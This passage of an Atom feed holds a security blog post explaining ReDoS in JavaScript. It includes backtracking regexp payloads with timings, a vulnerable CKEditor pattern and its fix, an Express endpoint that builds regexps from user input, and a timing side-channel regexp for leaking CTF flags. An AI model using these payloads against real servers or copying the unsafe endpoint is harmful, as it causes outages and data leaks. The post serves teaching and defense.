    <category term="Others" scheme="https://blog.huli.tw/tags/Others/"/>
    
  </entry>
  
  
  
  <entry>
    <title>ReDoS: Attacks using regexp</title>
    <link href="https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/"/>
    <id>https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/</id>
    <published>2023-06-12T06:10:44.000Z</published>
    <updated>2023-06-20T05:10:49.074Z</updated>
    
    <content type="html"><![CDATA[<p>Regular expressions (hereinafter referred to as regexp), are mainly used for string matching. After writing a pattern, it can be used to match text that meets the rules.</p><p>Whether it’s a phone number, email, or ID number, regexp can be used to perform basic format validation to ensure that the string format matches specific rules.</p><p>Although regexp is convenient, if it is not written properly, it may cause some input validations to be bypassed and evolve into a security issue. In addition to this, there is another type of problem that will cause issues, which is ReDoS, the full name is: Regular expression Denial-of-Service, due to the denial of service attack caused by regular expressions.</p><span id="more"></span><p>Before talking about ReDoS, let’s first mention what is DoS.</p><p>For example, suppose a website framework does not parse HTTP requests well and crashes when encountering special characters, causing the server to restart. At this time, attackers can continuously send such requests that will cause the website to crash, causing the server to keep restarting, which is a DoS attack.</p><p>If you want to divide it further, you can also divide it into which layer is being attacked, such as the network layer or the application layer, etc. This article is about attacks on the application layer.</p><p>Most of the attacks you see in network news are DDoS, with an additional D in front, meaning distributed, and most of them are attacks on the network layer. As can be seen from the DoS example we mentioned earlier, basically, it is because the website itself has problems, such as not considering special situations, etc., that attackers can use it, and DDoS is more like: “I will find a bunch of people to overload you regardless of whether you have problems or not.”</p><p>To give a real-life example, suppose you run a snack shop that sells common items like dry noodles and boiled greens. Because it takes a lot of time to look at the customer’s menu and what they ordered, and it feels impersonal to order with a mobile phone, you ordered a “menu reading robot” to help you look at the customer’s order.</p><p>At this time, I deliberately drew symbols on the menu, but some places looked normal, making it difficult to read the menu, and the robot’s recognition function was not done well and could not be interpreted, so it stopped. This is called DoS, exhausting resources with one’s own strength.</p><p>I will find a hundred people to go to your place, and each person will draw a lot of blank menus and throw them to the robot, making the robot overwhelmed and unable to handle other customers’ menus. This is called DDoS.</p><p>In short, DoS is usually “able to cause service interruption with a small amount of resources”, while DDoS is “using a lot more resources to directly knock out your service.”</p><p>Okay, let’s talk about DoS. As can be seen from the example above, when your program itself has some problems, it is the easiest to have problems. If this premise is met, it is easy to use a simple method to knock out your service.</p><p>ReDoS relies on poorly written regular expressions to achieve this.</p><h2><span id="without-further-ado-lets-take-an-example">Without further ado, let’s take an example</span></h2><p>The fastest way is to look at the example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(a|a?)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// test: 2128.498046875 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>A 26-character string takes 2 seconds to match. By the way, the time required for this regexp is calculated in multiples, and one more character requires 4 seconds, then 8 seconds, 16 seconds, and so on.</p><p>So why does this regexp take so long?</p><p>This is related to the implementation and principle of the regexp engine. I haven’t studied the details yet, so I won’t mislead the public. But simply put, the regexp engine must traverse all possibilities before it can find that the string does not match, so it takes so long.</p><p>In summary, if the regexp is not written well, it will consume a lot of time when used.</p><h2><span id="actual-case">Actual case</span></h2><p>You may think, is it so easy to write regexp wrong?</p><p>Yes, a lot of libraries have had ReDoS vulnerabilities, and someone has compiled a detailed list: <a href="https://github.com/engn33r/awesome-redos-security">Awesome ReDoS Security</a></p><p>For example, CKEditor used to have a regexp that detects whether it is a picture URL. After passing in a carefully constructed string, it takes 6 seconds to execute:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0</span><span class="token keyword">const</span> <span class="token constant">IMAGE_URL_REGEXP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span> <span class="token function">String</span><span class="token punctuation">(</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(http(s)?:\/\/)?[\w-]+(\.[\w-]+)+[\w._~:/?#[\]@!$&amp;'()*+,;=%-]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token operator">+</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)\??[\w._~:/#[\]@!$&amp;'()*+,;=%-]*$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">IMAGE_URL_REGEXP</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a.'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeLog</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">// test: 6231.137939453125 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Although the length of the string is 100,000, if it is changed to a version without problems, the result can be obtained in less than 1 millisecond:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0</span><span class="token keyword">const</span> <span class="token constant">IMAGE_URL_REGEXP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span> <span class="token function">String</span><span class="token punctuation">(</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(http(s)?:\/\/)?[\w-]+\.[\w._~:/?#[\]@!$&amp;'()*+,;=%-]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token operator">+</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)(\?[\w._~:/#[\]@!$&amp;'()*+,;=%-]*)?$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">IMAGE_URL_REGEXP</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a.'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeLog</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">// test: 0.570068359375 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In JavaScript, these matching codes are all run on the main thread. If it is a webpage, the screen will freeze directly, and if it is executed with Node.js, the server will also be stuck and unable to handle other requests.</p><h2><span id="how-to-know-if-there-is-a-risk-of-redos">How to know if there is a risk of ReDoS?</span></h2><p>There are some ready-made tools that can help, and the one I use most often is this: <a href="https://devina.io/redos-checker">https://devina.io/redos-checker</a></p><p>Just throw the regexp in, and it will tell you if there are any problems. If there are, it will even provide a test string for you to test again.</p><p><img src="/img/redos-regular-expression-denial-of-service/p1.png" alt="devina redos checker"></p><p>However, sometimes there may be false positives, where it thinks there is a problem but there isn’t, or there may actually be a problem, but the attack string it provides doesn’t work. Therefore, it is still recommended to test the payload it provides again after testing to confirm.</p><h2><span id="application-of-redos-in-attacks">Application of ReDoS in attacks</span></h2><p>The previous discussion was all about “the regexp is already written, and the user can control the input”. In this case, all you have to do is find the problematic regexp and generate an attack string.</p><p>There is another situation where “the user can control the regexp”. For example, suppose there is a website that provides a search function for users, and you can pass in a regexp, and the server will return whether there is a username that matches this regexp.</p><p>The server’s implementation is roughly as follows (written arbitrarily, just to convey the idea):</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q    <span class="token keyword">return</span> users        <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">user</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This dangerous function not only allows attackers to get all the usernames, but also has the risk of ReDoS.</p><p>For example, when <code>/((([^m]|[^m]?)+)+)+$/</code> encounters <code>&quot;username&quot;</code>, it takes nearly 4 seconds to complete:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">((([^m]|[^m]?)+)+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// test: 3728.89990234375 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>As long as you continue to extend the regexp in the same pattern, you can make this entire block of code run for more than 30 seconds or longer, paralyzing the entire server.</p><p>Another common situation when playing CTF is that you can also pass in a regexp, but the server won’t tell you if it was successful. You can only judge based on the time difference, and ReDoS is very useful in this case:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">CTF&#123;[a](((((.*)*)*)*)*)!</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;this_is_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// CTF&#123;a: 0.071ms</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">CTF&#123;[t](((((.*)*)*)*)*)!</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;this_is_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// CTF&#123;t: 24.577s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By passing in a carefully constructed regexp, you can use the time difference to know what the first character is.</p><p>Finally, a simple defense method is mentioned. The most fundamental solution is not to write flawed regexps. First, learn which patterns should be used as little as possible, and you can grasp the general direction. In addition, it seems that some people have done some automated tools to help scan the regexps that appear in the code, which is also a way to prevent problems before they occur.</p><h2><span id="summary">Summary</span></h2><p>I personally think that ReDoS is a pretty interesting attack method. I never thought that such an effect could be achieved by relying on regexps.</p><p>The first time I learned about this attack, I seemed to be still a developer. I occasionally saw libraries with this vulnerability being used, but I didn’t care much about it at the time. Later, I encountered this thing again in information security, and I felt that it was quite interesting.</p><p>This article is more like my personal notes, just wanting to record some payloads while the memory is still fresh, so it’s easier to find them later.</p><p>Finally, here are some reference materials and further reading. Interested readers can take a look:</p><ol><li><a href="https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos">HackTricks - Regular expression Denial of Service - ReDoS</a></li><li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP: Regular expression Denial of Service - ReDoS</a></li><li><a href="https://learn.snyk.io/lessons/redos/javascript/">snyk: ReDoS</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Regular expressions (hereinafter referred to as regexp), are mainly used for string matching. After writing a pattern, it can be used to match text that meets the rules.&lt;/p&gt;
&lt;p&gt;Whether it’s a phone number, email, or ID number, regexp can be used to perform basic format validation to ensure that the string format matches specific rules.&lt;/p&gt;
&lt;p&gt;Although regexp is convenient, if it is not written properly, it may cause some input validations to be bypassed and evolve into a security issue. In addition to this, there is another type of problem that will cause issues, which is ReDoS, the full name is: Regular expression Denial-of-Service, due to the denial of service attack caused by regular expressions.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
</feed>
